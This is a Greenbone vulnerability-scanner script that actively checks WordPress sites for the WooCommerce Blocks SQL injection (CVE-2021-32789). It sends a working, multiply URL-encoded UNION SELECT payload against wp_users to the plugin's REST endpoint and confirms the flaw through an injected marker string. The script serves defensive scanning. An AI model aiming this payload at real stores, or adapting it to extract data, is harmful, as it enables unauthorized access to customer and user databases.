CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.117571" );
	script_version( "2021-08-17T09:01:01+0000" );
	script_tag( name: "last_modification", value: "2021-08-17 09:01:01 +0000 (Tue, 17 Aug 2021)" );
	script_tag( name: "creation_date", value: "2021-07-20 08:18:25 +0000 (Tue, 20 Jul 2021)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2021-08-05 18:25:00 +0000 (Thu, 05 Aug 2021)" );
	script_cve_id( "CVE-2021-32789" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "WordPress WooCommerce Blocks Plugin SQL Injection Vulnerability (Jul 2021) - Active Check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2021 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "summary", value: "The WooCommerce Blocks plugin for WordPress is prone to an SQL
  injection vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "insight", value: "Via a carefully crafted URL, an exploit can be executed against
  the wc/store/products/collection-data?calculate_attribute_counts[][taxonomy] endpoint that allows
  the execution of a read only sql query." );
	script_tag( name: "impact", value: "The vulnerability allows unauthenticated attackers to access
  arbitrary data in an online store's database." );
	script_tag( name: "affected", value: "The vulnerability affects versions 2.5 to 5.5." );
	script_tag( name: "solution", value: "Updates are available. Please see the referenced advisory
  for more information." );
	script_xref( name: "URL", value: "https://woocommerce.com/posts/critical-vulnerability-detected-july-2021/#" );
	script_xref( name: "URL", value: "https://www.wordfence.com/blog/2021/07/critical-sql-injection-vulnerability-patched-in-woocommerce/" );
	script_xref( name: "URL", value: "https://viblo.asia/p/phan-tich-loi-unauthen-sql-injection-woocommerce-naQZRQyQKvx" );
	script_xref( name: "URL", value: "https://github.com/woocommerce/woocommerce-gutenberg-products-block/security/advisories/GHSA-6hq4-w6wv-8wrp" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
attack_pattern = "%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252cCHAR%252528115%25252c113%25252c108%25252c105%25252c45%25252c116%25252c101%25252c115%25252c116%252529%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500";
urls = make_list( dir + "/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern,
	 dir + "/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern,
	 dir + "/index.php/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern,
	 dir + "/index.php?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern );
for url in urls {
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	headers = http_extract_headers_from_response( data: res );
	body = http_extract_body_from_response( data: res );
	if(!body || !headers || !IsMatchRegexp( headers, "Content-Type\\s*:\\s*application/json" )){
		continue;
	}
	if(ContainsString( body, "\"term\":\"1:sqli-test\"" )){
		report = "It was possible to conduct an SQL injection attack via the following URL:\n\n";
		report += http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "\n\n";
		report += "Proof (The \"sqli-test\" string got created via an injected \"CHAR()\" SQL function):
";
		report += body;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

